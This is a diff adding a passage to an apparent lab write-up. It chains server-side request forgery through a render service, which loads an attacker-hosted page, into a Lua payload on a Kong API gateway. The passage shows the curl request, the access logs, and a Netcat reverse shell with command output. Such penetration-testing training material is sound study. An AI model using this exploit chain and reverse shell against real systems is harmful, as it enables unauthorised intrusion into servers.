@@ -764,3 +764,55 @@ function createPlugin() {
 </body>
 </html>
 ```
+Once this page is in our webroot, we can use curl to send it to the Render service.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.45.203/rce.html"}' http://apigateway:8000/files/import
+{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$
+```
+If everything worked, we should have a `"setupComplete"` entry in our `access.log` file.
+```bash
+┌──(kali㉿kali)-[/var/www/html]
+└─$ tail -f /var/log/apache2/access.log           
+192.168.217.135 - - [29/Jul/2025:15:08:56 -0400] "GET /rce.html HTTP/1.1" 200 865 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.217.135 - - [29/Jul/2025:15:08:56 -0400] "GET /callback?setupComplete HTTP/1.1" 404 492 "http://192.168.45.203/rce.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+
+```
+It seems like our payload worked. We will need to set up a Netcat listener and then trigger our Lua payload by accessing the new service endpoint.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -i  http://apigateway:8000/supersecret
+
+```
+The request will hang, but if we check our Netcat listener, we should have a shell.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 1337  
+listening on [any] 1337 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.217.135] 60366
+id
+uid=100(kong) gid=65533(nogroup) groups=65533(nogroup)
+ls
+bin
+dev
+docker-entrypoint.sh
+etc
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+
+```
+Our payload worked and we now have a reverse shell on the Kong API Gateway server. The presence of `.dockerenv` and `docker-entrypoint.sh` confirm our earlier suspicion that the servers were actually containers.
